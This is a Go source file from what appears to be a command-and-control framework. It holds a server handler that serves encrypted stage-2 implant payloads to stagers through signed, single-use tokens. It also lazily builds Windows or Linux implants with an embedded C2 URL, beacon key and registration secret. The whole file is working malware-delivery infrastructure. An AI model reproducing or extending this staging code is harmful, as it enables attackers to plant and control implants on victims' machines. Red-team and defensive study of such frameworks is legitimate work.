package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

// handleServeStage serves the AES-256-GCM encrypted stage-2 payload for a
// signed stage token. The URL must carry a valid HMAC signature (?s=) derived
// from the server stager key, the token must exist and must not be expired.
// The payload is stored and served only in encrypted form; the matching stager
// decrypts it with the per-token key embedded at generation time.
func (s *Server) handleServeStage(c *gin.Context) {
	token := c.Param("token")
	if !isHexToken(token) {
		c.String(http.StatusBadRequest, "invalid stage token")
		return
	}

	sig := c.Query("s")
	if sig == "" || !payload.VerifyStageSignature(token, sig) {
		c.String(http.StatusForbidden, "invalid signature")
		return
	}

	var tok db.StagerToken
	if err := s.db.First(&tok, "token = ?", token).Error; err != nil {
		c.String(http.StatusNotFound, "stage token not found")
		return
	}

	// Bound: the blob is never reachable after the token expires, even though
	// it stays encrypted at rest.
	if time.Now().After(tok.ExpiresAt) {
		c.String(http.StatusGone, "stage token expired")
		return
	}

	// Stager tokens are single-use: a token that was already served must not
	// be reusable, so a leaked/compromised URL cannot be replayed to fetch
	// additional stage-2 copies.
	if tok.Used {
		c.String(http.StatusGone, "stage token already consumed")
		return
	}

	dataDir := s.rawDataDir()
	if dataDir == "" {
		dataDir = "data"
	}

	// Atomically claim the token BEFORE the blob is touched. Only one request
	// can win the row update, and the loser stops here.
	//
	// Ordering matters: when the claim came after the read, a second request
	// that had already passed the Used check (its row read was stale) fell
	// through to the lazy rebuild as soon as the winner deleted the blob. It
	// then minted a second registration secret and wrote a second encrypted
	// stage-2 for a token that was already consumed — the exact reuse this
	// gate exists to prevent — and where the build could not run (no listener,
	// no toolchain) it answered 404 instead of 410. Claiming first means a
	// loser never builds, never writes, and always sees 410.
	claim := s.db.Model(&db.StagerToken{}).
		Where("id = ? AND used = ?", tok.ID, false).
		Update("used", true)
	if claim.Error != nil {
		slog.Error("failed to consume stage token", "err", claim.Error)
		c.String(http.StatusInternalServerError, "stage not available")
		return
	}
	if claim.RowsAffected == 0 {
		c.String(http.StatusGone, "stage token already consumed")
		return
	}

	blob, err := payload.LoadStage2Blob(dataDir, token)
	if err != nil {
		if !os.IsNotExist(err) {
			s.releaseStageClaim(tok.ID)
			c.String(http.StatusInternalServerError, "stage not available")
			return
		}
		// Lazy build: stage-2 payloads are generated on first fetch so the
		// (fast) register API does not block on the toolchain.
		if buildErr := s.buildStage2Blob(&tok); buildErr != nil {
			s.releaseStageClaim(tok.ID)
			c.String(http.StatusNotFound, "stage not ready")
			return
		}
		blob, err = payload.LoadStage2Blob(dataDir, token)
		if err != nil {
			s.releaseStageClaim(tok.ID)
			c.String(http.StatusInternalServerError, "stage not available")
			return
		}
	}

	// The encrypted blob is no longer needed once the token is consumed.
	_ = os.Remove(payload.Stage2BlobPath(dataDir, token))

	c.Header("Cache-Control", "no-store")
	c.Data(http.StatusOK, "application/octet-stream", blob)
}

// releaseStageClaim un-consumes a token whose request failed before any
// payload byte reached the client, so a missing toolchain or a disk error does
// not burn the single-use URL the stager is holding. It runs only on paths
// that served nothing, so a token stays single-use for every request that
// actually received stage-2.
func (s *Server) releaseStageClaim(id uint) {
	if err := s.db.Model(&db.StagerToken{}).
		Where("id = ? AND used = ?", id, true).
		Update("used", false).Error; err != nil {
		slog.Error("failed to release stage token claim", "token_id", id, "err", err)
	}
}

func isHexToken(s string) bool {
	if s == "" {
		return false
	}
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
			return false
		}
	}
	return true
}

// buildStage2Blob generates the stage-2 payload for a token (Windows or Linux
// per the token's OS/format), encrypts it at rest and removes the transient
// plaintext. Builds for the same token are serialized to avoid redundant
// toolchain invocations when several implants fetch simultaneously.
func (s *Server) buildStage2Blob(tok *db.StagerToken) error {
	unlock := s.stageBuildLock(tok.Token)
	defer unlock()

	dataDir := s.rawDataDir()
	if dataDir == "" {
		dataDir = "data"
	}
	if _, err := os.Stat(payload.Stage2BlobPath(dataDir, tok.Token)); err == nil {
		return nil
	}

	listener, err := s.resolveListener(tok.ListenerID)
	if err != nil {
		return err
	}

	arch := tok.Architecture
	if arch == "" {
		arch = "amd64"
	}
	format := tok.Format
	if format == "" {
		format = "exe"
	}

	// v3: create a per-implant registration secret and embed it in the stage-2,
	// exactly like the eager generate path. Without this the stage-2 carries no
	// secret/beacon key and (with v2 master-key auth rejected) can never
	// register. The build is cached after the first fetch, so the secret is
	// created only once per token.
	//
	// The fetch is unauthenticated, so the minting tenant is resolved from the
	// token's creator: whoever registered the stage token owns the implant the
	// lazy build will produce. Tokens without a creator (pre-tenant rows, test
	// fixtures) stay on the legacy bootstrap-default path via 0.
	beaconKey := s.serverBeaconKey()
	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey, s.tenantIDForUser(tok.CreatedBy))
	if err != nil {
		return fmt.Errorf("create v3 registration secret: %w", err)
	}

	stagerCfg := payload.StagerConfig{
		ListenerID:   tok.ListenerID,
		C2URL:        listener.C2URL,
		Protocol:     listener.Protocol,
		Architecture: arch,
		Format:       format,
		DNSDomain:    listener.DNSDomain,
		DNSServer:    listener.DNSServer,
		BeaconKey:    beaconKey,
		RegSecretID:  regSecretID,
		RegSecret:    regSecretB64,
	}

	agentsDir := s.rawDataDir()
	if agentsDir == "" {
		agentsDir = "data"
	}
	agentsDir += "/agents"

	var stagePath string
	switch strings.ToLower(tok.OS) {
	case "linux":
		stagePath, err = payload.GenerateStagerStage2Linux(stagerCfg, agentsDir)
	default:
		stagePath, err = payload.GenerateStagerStage2(stagerCfg, agentsDir)
	}
	if err != nil {
		return err
	}

	plaintext, err := os.ReadFile(stagePath)
	if err != nil {
		return err
	}
	if err := payload.WriteStage2Blob(dataDir, tok.Token, plaintext); err != nil {
		return err
	}

	// The transient plaintext build output must not remain on disk.
	_ = os.Remove(stagePath)
	return nil
}

// stageBuildLock returns a per-token mutex used to serialize lazy stage-2
// builds for the same token.
func (s *Server) stageBuildLock(token string) func() {
	s.stageBuildLocksMu.Lock()
	if s.stageBuildLocks == nil {
		s.stageBuildLocks = make(map[string]*sync.Mutex)
	}
	m, ok := s.stageBuildLocks[token]
	if !ok {
		m = &sync.Mutex{}
		s.stageBuildLocks[token] = m
	}
	s.stageBuildLocksMu.Unlock()
	m.Lock()
	return func() {
		m.Unlock()
		s.stageBuildLocksMu.Lock()
		delete(s.stageBuildLocks, token)
		s.stageBuildLocksMu.Unlock()
	}
}
